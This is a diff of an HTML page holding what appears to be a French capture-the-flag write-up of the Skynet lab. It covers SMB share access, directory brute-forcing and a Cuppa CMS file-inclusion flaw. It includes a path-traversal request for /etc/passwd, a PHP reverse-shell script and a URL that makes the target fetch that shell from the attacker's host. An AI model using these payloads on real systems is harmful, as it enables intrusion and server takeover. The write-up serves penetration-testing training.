-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  5.02 Visualization.md               N      940  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  5.00 In Practice.md                 N       21  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  1.10 Algorithms.md                  N    28790  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  3.04 Filtering.md                   N    13360  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">  1.00 Foundations.md                 N       22  Tue Sep 17 10:01:29 2019</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">        9204224 blocks of size 1024. 5831364 blocks available</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">smb: \notes\&gt; get important.txt </span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">getting file \notes\important.txt of size 117 as important.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">smb: \notes\&gt; exit</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">smbclient //skynet.thm/milesdyson -U milesdyson </span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Password for [WORKGROUP\milesdyson]:</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Try "help" to get a list of possible commands.</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">smb: \&gt; ls</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  .                                   D        0  Tue Sep 17 10:05:47 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  ..                                  D        0  Wed Sep 18 04:51:03 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 10:05:14 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 10:05:14 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 10:05:14 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  notes                               D        0  Tue Sep 17 10:18:40 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 10:05:14 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 10:05:14 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">        9204224 blocks of size 1024. 5831368 blocks available</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">smb: \&gt; cd notes\</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">smb: \notes\&gt; ls</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  .                                   D        0  Tue Sep 17 10:18:40 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  ..                                  D        0  Tue Sep 17 10:05:47 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  3.01 Search.md                      N    65601  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  2.08 In Practice.md                 N     7949  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  0.00 Cover.md                       N     3114  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  1.02 Linear Algebra.md              N    70314  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  important.txt                       N      117  Tue Sep 17 10:18:39 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  6.01 pandas.md                      N     9221  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  2.01 Overview.md                    N     1165  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  3.02 Planning.md                    N    71657  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  1.04 Probability.md                 N    62712  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  2.00 Machine Learning.md            N       26  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  1.03 Calculus.md                    N    40779  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  6.00 Appendices.md                  N       20  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  1.01 Functions.md                   N     7627  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  2.03 Neural Nets.md                 N   144726  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  2.04 Model Selection.md             N    33383  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  2.02 Supervised Learning.md         N    94287  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  4.00 Simulation.md                  N       20  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  3.05 In Practice.md                 N     1123  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  1.07 Graphs.md                      N     5110  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  5.03 Anonymization.md               N     2516  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  5.01 Process.md                     N     5788  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  1.09 Optimization.md                N    25823  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  1.05 Statistics.md                  N    64291  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  5.02 Visualization.md               N      940  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  5.00 In Practice.md                 N       21  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  1.10 Algorithms.md                  N    28790  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  3.04 Filtering.md                   N    13360  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">  1.00 Foundations.md                 N       22  Tue Sep 17 10:01:29 2019</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">        9204224 blocks of size 1024. 5831364 blocks available</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">smb: \notes\&gt; get important.txt </span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">getting file \notes\important.txt of size 117 as important.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">smb: \notes\&gt; exit</span>
+</code></code></pre></div></div>
 <p>On a pu récupérer le fichier <code>important.txt</code>. Analysons son contenu</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">───────┬──────────────────────────────────────────────────────────────────────────────────</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">       │ File: important.txt</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">───────┼──────────────────────────────────────────────────────────────────────────────────</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">   1   │ </span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">   2   │ 1. Add features to beta CMS /45kra24zxs28v3yd</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">   3   │ 2. Work on T-800 Model 101 blueprints</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">   4   │ 3. Spend more time with my wife</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">───────┬──────────────────────────────────────────────────────────────────────────────────</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">       │ File: important.txt</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">───────┼──────────────────────────────────────────────────────────────────────────────────</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">   1   │ </span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">   2   │ 1. Add features to beta CMS /45kra24zxs28v3yd</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">   3   │ 2. Work on T-800 Model 101 blueprints</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">   4   │ 3. Spend more time with my wife</span>
+</code></code></pre></div></div>
 <p>Interessant. Le site utilise donc un CMS  situé à <code>/45kra24zxs28v3yd</code> . </p>
 <p>En nous rendant à cettte addresse on tombe sur une page qui nous parle de Dr. Miles Bennett Dyson. Cherchons les dossiers cachés avec gobuster </p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">gobuster dir -u http://skynet.thm/45kra24zxs28v3yd -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">gobuster dir -u http://skynet.thm/45kra24zxs28v3yd -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</span>
+</code></code></pre></div></div>
 <p>Résultat :</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Gobuster v3.8</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Url:                     http://skynet.thm/45kra24zxs28v3yd</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Method:                  GET</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Threads:                 10</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Negative Status codes:   404</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] User Agent:              gobuster/3.8</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Timeout:                 10s</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Starting gobuster in directory enumeration mode</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/.hta                 (Status: 403) [Size: 275]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/.htaccess            (Status: 403) [Size: 275]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/.htpasswd            (Status: 403) [Size: 275]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/administrator        (Status: 301) [Size: 333] [--&gt; http://skynet.thm/45kra24zxs28v3yd/administrator/]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/index.html           (Status: 200) [Size: 418]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Progress: 4750 / 4750 (100.00%)</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Finished</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Gobuster v3.8</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Url:                     http://skynet.thm/45kra24zxs28v3yd</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Method:                  GET</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Threads:                 10</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Negative Status codes:   404</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] User Agent:              gobuster/3.8</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Timeout:                 10s</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Starting gobuster in directory enumeration mode</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/.hta                 (Status: 403) [Size: 275]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/.htaccess            (Status: 403) [Size: 275]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/.htpasswd            (Status: 403) [Size: 275]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/administrator        (Status: 301) [Size: 333] [--&gt; http://skynet.thm/45kra24zxs28v3yd/administrator/]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/index.html           (Status: 200) [Size: 418]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Progress: 4750 / 4750 (100.00%)</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Finished</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">===============================================================</span>
+</code></code></pre></div></div>
 <p>On a le chemin <code>/administrator</code> . En nous y rendant on tombe sur la page de connexion de <code>Cuppa CMS</code> . En cherchant sur google , ce CMS est vulnérable à une locale et remote File Inclusion ( <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-34121">**<code>CVE-2022-25485</code></a> de CVSS 7.8 Elevé)**</p>
 <h2 id="obtention-du-shell">Obtention du shell</h2>
 <p>Cuppa CMS est vulnérable à une LFI et une RFI. En effet dans son code source, le fichier 
 <code>/alerts/alertConfigField.php</code>  on trouve à la ligne 22</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">php</span><button class="copy-btn">Copier</button></div><pre><code class="language-php">&lt;?php include($_REQUEST["urlConfig"]); ?&gt;
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">php</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-php"><code class="language-php">&lt;?php include($_REQUEST["urlConfig"]); ?&gt;
+</code></code></pre></div></div>
 <ul>
 <li>$_REQUEST["urlConfig"] récupère n’importe quelle donnée envoyée par l’utilisateur via l’URL ou le formulaire</li>
 <li>include()  prend un fichier et l’éxecute comme code</li>
 </ul>
 <p>Ainsi l’attaquant détourne l’utilisation prévue du paramètre pour lire un fichier qu’il ne devait pas voire  et peut lire un fichier interne du serveur (LFI). Pire si la configuration PHP(allow_include) le permet l’utilisateur peut inclure un fichier stocké sur un serveur distant(RFI)</p>
 <p>Vérifions maintenant la présence de la vulnérabilité.</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+</code></code></pre></div></div>
 <p>On as accès au contenu entier du fichier. La cible est donc vulnérable. On peut donc essayer d’exploiter le RFI pour obtenir un shell. Sur notre machine on cré un fichier shell.php qui contient le script de notre reverse shell de pentester monkey</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">php</span><button class="copy-btn">Copier</button></div><pre><code class="language-php">&lt;?php
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">php</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-php"><code class="language-php">&lt;?php
 // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
 
@@ -458,16 +453,16 @@ function printit ($string) {
 }
 
 ?&gt;
-</code></pre></div>
+</code></code></pre></div></div>
 <p>On va ensuite lancer un serveur python sur notre machine</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">python3 -m http.server 8000</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">python3 -m http.server 8000</span>
+</code></code></pre></div></div>
 <p>On lance ensuite un écouteur sur notre machine qui attends une connexion</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">nc -lvnp 9001</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">nc -lvnp 9001</span>
+</code></code></pre></div></div>
 <p>On peut maintenant forcer la cible à télécharger notre reverse shell en nous rendant à l’adresse</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<notre_ip>:8000/shell.php</notre_ip></span>
-</code></pre></div>
